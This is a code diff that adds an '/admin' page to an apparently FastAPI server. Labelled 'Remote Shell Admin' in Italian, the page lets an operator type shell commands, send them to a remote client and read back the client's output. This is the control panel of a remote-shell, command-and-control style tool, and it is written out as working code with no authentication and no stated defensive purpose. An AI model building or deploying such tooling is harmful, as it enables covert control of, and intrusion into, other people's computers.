@@ -62,6 +62,48 @@ async def receive_result(output: str = Form(...)):
 async def get_result():
     return {"output": last_output}
 
+# --------------------------
+# ✅ INTERFACCIA /admin
+# --------------------------
+@app.get("/admin", response_class=HTMLResponse)
+async def admin_page():
+    return """
+    <html>
+    <head>
+        <title>Remote Shell Admin</title>
+        <style>
+            body { font-family: monospace; background: #111; color: #eee; padding: 2rem; }
+            textarea, input { width: 100%; margin-top: 1rem; background: #222; color: #0f0; border: none; padding: 0.5rem; font-family: monospace; }
+            button { background: #444; color: white; padding: 0.5rem 1rem; margin-top: 1rem; }
+        </style>
+        <script>
+            async function sendCommand() {
+                const cmd = document.getElementById('command').value;
+                await fetch('/set-command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'command=' + encodeURIComponent(cmd)
+                });
+                document.getElementById('output').value = "In attesa di risposta...";
+                setTimeout(fetchOutput, 5000);
+            }
+
+            async function fetchOutput() {
+                const res = await fetch('/command-result');
+                const json = await res.json();
+                document.getElementById('output').value = json.output;
+            }
+        </script>
+    </head>
+    <body>
+        <h2>Remote CMD</h2>
+        <input type="text" id="command" placeholder="Inserisci comando shell (es: ipconfig)" />
+        <button onclick="sendCommand()">Invia Comando</button>
+        <textarea id="output" rows="20" placeholder="Output del client..."></textarea>
+    </body>
+    </html>
+    """
+
 
 @app.get("/", response_class=HTMLResponse)
 async def root():
